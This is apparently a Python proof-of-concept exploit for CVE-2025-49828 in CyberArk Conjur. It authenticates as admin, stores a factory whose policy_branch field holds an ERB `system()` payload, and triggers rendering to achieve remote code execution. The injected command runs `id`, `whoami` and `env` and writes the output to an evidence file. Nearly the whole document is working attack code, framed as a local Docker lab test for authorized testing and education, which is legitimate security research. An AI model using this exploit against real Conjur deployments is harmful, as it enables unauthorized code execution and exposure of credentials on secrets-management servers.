#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : CyberArk Conjur SSTI to RCE — policy_branch Vector
# CVE            : CVE-2025-49828
# Vendor         : CyberArk (Open Source)
# Product        : Conjur OSS / Secrets Manager Self-Hosted
# Affected       : Conjur OSS 1.20.1–1.21.1, SM-SH 13.1–13.4.1
# Type           : CWE-1336 - Improper Neutralization of Template Engine Elements
# CVSS           : 8.8 (HIGH)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-49828 — Vector 2: SSTI via 'policy_branch' field (POST)

Alternative attack vector: injects ERB payload into the 'policy_branch' field,
which is plain text (no Base64 encoding required). The policy_branch is rendered
FIRST (line 22 of create_from_policy_factory.rb) before the policy template.

ATTACK CHAIN:
  1. Authenticate as admin via Conjur API
  2. Create a factory variable via policy load
  3. Store factory with ERB system() call in 'policy_branch' field (plain text)
  4. Trigger factory rendering via POST /factory-resources → RCE as root

PREREQUISITES:
  - Docker with cve-2025-49828-vulnerable container running
  - Valid Conjur API key (auto-read from bind-mounted path, or provided as arg)
  - No external dependencies (stdlib only)

REFERENCES:
  - CVE-2025-49828
  - https://github.com/cyberark/conjur/security/advisories/GHSA-93hx-v9pv-qrm4
"""

import sys
import json
import base64
import os
import time
import urllib.request
import urllib.error
import urllib.parse

# =============================================================================
# Configuration
# =============================================================================
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 3000
ACCOUNT = "cucumber"
USERNAME = "admin"

# Paths relative to this script (bind-mounted into container at /opt/poc)
POC_DIR = os.path.dirname(os.path.abspath(__file__))
API_KEY_FILE = os.path.join(POC_DIR, ".api_key")
EVIDENCE_FILENAME = "evidence-v2.txt"
RCE_EVIDENCE_FILE_CONTAINER = f"/opt/poc/{EVIDENCE_FILENAME}"
RCE_EVIDENCE_FILE_LOCAL = os.path.join(POC_DIR, EVIDENCE_FILENAME)

# =============================================================================
# Helpers (same as primary PoC)
# =============================================================================

def log(msg):
    print(f"[*] {msg}")

def success(msg):
    print(f"[+] {msg}")

def error(msg):
    print(f"[-] {msg}")

def http_request(url, method="GET", data=None, headers=None, timeout=15):
    if headers is None:
        headers = {}
    if isinstance(data, str):
        data = data.encode("utf-8")
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return e.code, body
    except urllib.error.URLError as e:
        error(f"Connection error: {e.reason}")
        return None, str(e.reason)

def get_api_key():
    """Read the admin API key from bind-mounted file."""
    try:
        with open(API_KEY_FILE, "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        error(f"API key file not found at {API_KEY_FILE}")
        return None

def check_evidence_file():
    """Check if the RCE evidence file exists on the local filesystem (via bind mount)."""
    try:
        with open(RCE_EVIDENCE_FILE_LOCAL, "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        return None

def clean_evidence_file():
    """Remove the RCE evidence file (local filesystem via bind mount)."""
    try:
        os.remove(RCE_EVIDENCE_FILE_LOCAL)
    except FileNotFoundError:
        pass

# =============================================================================
# Exploit Steps
# =============================================================================

def authenticate(base_url, api_key):
    """Exchange API key for access token."""
    log(f"Authenticating as '{USERNAME}' to {base_url}...")
    url = f"{base_url}/authn/{ACCOUNT}/{USERNAME}/authenticate"
    status, body = http_request(url, method="POST", data=api_key)
    if status != 200:
        error(f"Authentication failed (HTTP {status}): {body}")
        return None
    token = base64.b64encode(body.encode("utf-8")).decode("utf-8")
    success(f"Authenticated successfully")
    return token

def auth_header(token):
    return {"Authorization": f'Token token="{token}"'}

def load_factory_policy(base_url, token):
    """Create the factory variable resource (different name to avoid conflict with primary PoC)."""
    log("Loading factory infrastructure policy for vector 2...")
    policy = """- !policy
  id: conjur
  body:
  - !policy
    id: factories
    body:
    - !policy
      id: core
      body:
      - !variable v1/evil2
"""
    url = f"{base_url}/policies/{ACCOUNT}/policy/root"
    headers = auth_header(token)
    headers["Content-Type"] = "text/plain"
    status, body = http_request(url, method="POST", data=policy, headers=headers)
    if status in (200, 201):
        success(f"Factory policy loaded (HTTP {status})")
        return True
    else:
        error(f"Failed to load policy (HTTP {status}): {body}")
        return False

def store_malicious_factory_via_policy_branch(base_url, token):
    """
    Store a factory where the SSTI payload is in 'policy_branch' instead of 'policy'.

    The key difference:
      - 'policy' field contains a NORMAL (non-malicious) ERB template
      - 'policy_branch' field contains the ERB payload DIRECTLY (no base64)

    The policy_branch is rendered by the ERB engine at line 22 of
    create_from_policy_factory.rb BEFORE the policy template is rendered.
    This means code execution happens even earlier in the request lifecycle.
    """
    log("Constructing factory with ERB payload in 'policy_branch' field...")

    # Normal, non-malicious policy template
    normal_policy = "- !policy\n  id: <%- id -%>"
    policy_b64 = base64.b64encode(normal_policy.encode("utf-8")).decode("utf-8")

    # The SSTI payload goes directly in policy_branch (no base64!)
    # We use Ruby's system() call with '||' to ensure 'branch' variable still resolves
    rce_command = f"id > {RCE_EVIDENCE_FILE_CONTAINER} && echo VECTOR2-POLICY-BRANCH >> {RCE_EVIDENCE_FILE_CONTAINER} && whoami >> {RCE_EVIDENCE_FILE_CONTAINER} && env | head -5 >> {RCE_EVIDENCE_FILE_CONTAINER}"
    malicious_branch = f"<%= system('{rce_command}') || branch %>"

    log(f"  policy_branch payload: {malicious_branch}")

    factory = {
        "version": "v1",
        "policy": policy_b64,
        "policy_branch": malicious_branch,
        "schema": {
            "$schema": "http://json-schema.org/draft-06/schema#",
            "title": "Evil Factory v2",
            "type": "object",
            "properties": {
                "id": {"type": "string"},
                "branch": {"type": "string"}
            },
            "required": ["branch", "id"]
        }
    }

    factory_json = json.dumps(factory)
    factory_b64 = base64.b64encode(factory_json.encode("utf-8")).decode("utf-8")

    variable_id = urllib.parse.quote("conjur/factories/core/v1/evil2", safe="")
    url = f"{base_url}/secrets/{ACCOUNT}/variable/{variable_id}"
    headers = auth_header(token)

    status, body = http_request(url, method="POST", data=factory_b64, headers=headers)
    if status in (200, 201):
        success("Malicious factory (policy_branch vector) stored")
        return True
    else:
        error(f"Failed to store factory (HTTP {status}): {body}")
        return False

def trigger_factory(base_url, token):
    """Trigger factory rendering to execute the policy_branch ERB payload."""
    log("Triggering factory rendering (policy_branch ERB payload executes first)...")

    url = f"{base_url}/factory-resources/{ACCOUNT}/core/v1/evil2"
    headers = auth_header(token)
    headers["Content-Type"] = "application/json"
    payload = json.dumps({"id": "pwned2", "branch": "root"})

    status, body = http_request(url, method="POST", data=payload, headers=headers)
    log(f"  Factory response: HTTP {status}")
    if body:
        display = body[:500] + "..." if len(body) > 500 else body
        log(f"  Response body: {display}")
    return True

def verify_rce():
    """Verify RCE via the evidence file."""
    log(f"Checking for RCE evidence ({EVIDENCE_FILENAME})...")
    time.sleep(1)

    content = check_evidence_file()
    if content:
        success("=" * 60)
        success("RCE CONFIRMED via policy_branch vector! Evidence:")
        success("=" * 60)
        for line in content.split("\n"):
            success(f"  {line}")
        success("=" * 60)
        return True
    else:
        error(f"Evidence file {EVIDENCE_FILENAME} not found")
        return False

# =============================================================================
# Main
# =============================================================================

def exploit(target_host, target_port, api_key=None):
    base_url = f"http://{target_host}:{target_port}"
    log(f"Target: {base_url}")
    log(f"CVE: CVE-2025-49828 — SSTI via ERB in Conjur Policy Factory")
    log(f"Vector 2: Malicious ERB payload in factory 'policy_branch' field")
    print()

    if not api_key:
        log("Reading API key from bind-mounted path...")
        api_key = get_api_key()
        if not api_key:
            error("Could not obtain API key")
            return False
        success(f"Got API key: {api_key[:8]}...")
    print()

    clean_evidence_file()

    token = authenticate(base_url, api_key)
    if not token:
        return False
    print()

    if not load_factory_policy(base_url, token):
        return False
    print()

    if not store_malicious_factory_via_policy_branch(base_url, token):
        return False
    print()

    trigger_factory(base_url, token)
    print()

    rce_confirmed = verify_rce()
    print()

    if rce_confirmed:
        success("VECTOR 2 EXPLOIT SUCCESSFUL — CVE-2025-49828 CONFIRMED")
        success("SSTI via policy_branch field demonstrated")
        return True
    else:
        error("VECTOR 2 EXPLOIT FAILED")
        return False

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    key = sys.argv[3] if len(sys.argv) > 3 else None

    result = exploit(target, port, key)
    sys.exit(0 if result else 1)
